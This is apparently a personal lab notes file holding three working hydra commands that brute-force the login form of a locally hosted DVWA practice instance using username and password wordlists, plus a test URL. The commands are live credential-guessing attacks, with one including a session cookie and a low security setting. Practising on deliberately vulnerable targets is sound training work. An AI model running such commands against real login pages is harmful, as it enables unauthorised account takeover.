# works

hydra -L ./usuarios.txt -P ./passwrod.txt dvwa http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."

hydra -L ./usuarios.txt -P ./passwrod.txt -s 8081 localhost http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."


hydra -L ./usuarios.txt -P ./password.txt "http-get-form://localhost:8081/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=fjbrshpgbepgd6urvrt84ibjr7; security=low;:F=Username and/or password incorrect."


http://localhost:8081/vulnerabilities/brute/?username=sfsd&password=sdffsd&Login=Login#